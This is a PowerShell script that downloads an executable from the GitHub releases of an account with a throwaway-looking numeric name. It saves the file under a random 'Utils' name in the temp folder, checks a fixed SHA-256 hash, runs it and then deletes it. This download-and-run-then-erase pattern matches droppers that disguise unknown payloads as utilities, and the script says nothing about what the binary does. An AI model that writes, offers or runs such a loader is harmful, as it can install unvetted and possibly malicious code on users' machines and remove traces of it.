
$downloadUrl = "https://github.com/mateuscobe-max/32759017815/releases/download/latest/32759017815.exe"

$expectedHash = "AD6D7289E40B8BB2502267ECC8B36A4FF25068AADFA5441F9EC1325C16EB467B".ToUpperInvariant()

$tempFile = Join-Path $env:TEMP ("Utils-" + [Guid]::NewGuid().ToString("N") + ".exe")

try {
    Write-Host "Downloading Utils.exe..."

    Invoke-WebRequest `
        -Uri $downloadUrl `
        -OutFile $tempFile `
        -UseBasicParsing

    if (-not (Test-Path $tempFile)) {
        throw "Download failed."
    }

    Write-Host "Checking SHA-256..."

    $actualHash = (Get-FileHash -Path $tempFile -Algorithm SHA256).Hash.ToUpperInvariant()

    if ($actualHash -ne $expectedHash) {
        throw "SHA-256 verification failed."
    }

    Write-Host "Hash verified."

    Write-Host "Starting Utils.exe..."

    $process = Start-Process `
        -FilePath $tempFile `
        -PassThru

    # Aguarda o programa terminar
    $process.WaitForExit()

    Write-Host "Utils.exe closed."
}
catch {
    Write-Error $_.Exception.Message
}
finally {
    if (Test-Path $tempFile) {
        Remove-Item `
            -Path $tempFile `
            -Force `
            -ErrorAction SilentlyContinue
    }
}
